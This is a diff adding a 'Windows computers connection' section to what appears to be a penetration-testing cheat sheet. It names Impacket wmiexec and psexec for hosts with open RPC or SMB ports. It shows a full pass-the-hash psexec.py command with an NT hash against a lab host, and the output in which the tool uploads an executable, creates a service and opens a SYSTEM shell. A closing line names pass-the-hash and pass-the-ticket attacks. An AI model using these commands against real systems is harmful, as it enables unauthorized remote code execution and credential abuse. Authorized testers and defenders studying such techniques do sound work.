@@ -257,5 +257,32 @@ $ nbtscan 192.168.100.0/24
 ```
 
 
+# Windows computers connection
+
+- RPC open (port 135) use  [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) 
+-  445 port (SMB) open  use impacket psexec
+
+```powershell
+$ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.100.10.....
+[*] Found writable share ADMIN$
+[*] Uploading file WFKqIQpM.exe
+[*] Opening SVCManager on 192.168.100.10.....
+[*] Creating service AoRl on 192.168.100.10.....
+[*] Starting service AoRl.....
+[!] Press help for extra shell commands
+The system cannot find message text for message number 0x2350 in the message file for Application.
+
+(c) Microsoft Corporation. All rights reserved.
+b'Not enough memory resources are available to process this command.\r\n'
+C:\Windows\system32>whoami
+nt authority\system
+```
 
 
+- now NT hash is used as PtH , is Kerberos authentication is used PtT attack happens
+
+
+- 
